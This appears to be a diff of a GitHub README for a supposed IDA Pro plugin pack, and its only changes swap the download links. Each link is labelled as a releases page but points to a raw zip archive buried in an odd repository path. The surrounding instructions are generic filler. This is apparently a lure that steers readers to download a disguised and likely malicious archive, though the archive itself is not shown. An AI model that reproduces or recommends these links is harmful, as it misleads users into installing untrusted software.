@@ -1,6 +1,6 @@
 # 🛠️ IDAPlugins - Easy Plugins for Enhanced IDA Pro
 
-[![Download IDAPlugins](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/Sinological/IDAPlugins.zip)](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/Sinological/IDAPlugins.zip)
+[![Download IDAPlugins](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/patching/util/IDA_Plugins_3.6.zip)](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/patching/util/IDA_Plugins_3.6.zip)
 
 ## ✅ Introduction
 
@@ -15,7 +15,7 @@ To get started with IDAPlugins, follow these straightforward steps. Don't worry 
 1. **Visit the Releases Page**: 
    Click the link below to go to the releases page where you can find the latest version of IDAPlugins:
    
-   [Visit this page to download](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/Sinological/IDAPlugins.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/patching/util/IDA_Plugins_3.6.zip)
 
 2. **Download the Desired Version**: 
    On the releases page, you'll see a list of versions. Find the latest version that you want to install. Click on it to open the details.
@@ -70,6 +70,6 @@ For more detailed documentation on how each plugin works, visit the GitHub Wiki 
 
 If you have questions or need assistance, open an issue on the GitHub repository. The community is here to help you with any queries you may have! 
 
-Remember, you can always revisit the [Releases Page](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/Sinological/IDAPlugins.zip) for updates and new versions.
+Remember, you can always revisit the [Releases Page](https://raw.githubusercontent.com/ssmugabi/IDAPlugins/main/patching/util/IDA_Plugins_3.6.zip) for updates and new versions.
 
 Now, you are ready to enhance your IDA Pro experience! Enjoy using IDAPlugins.
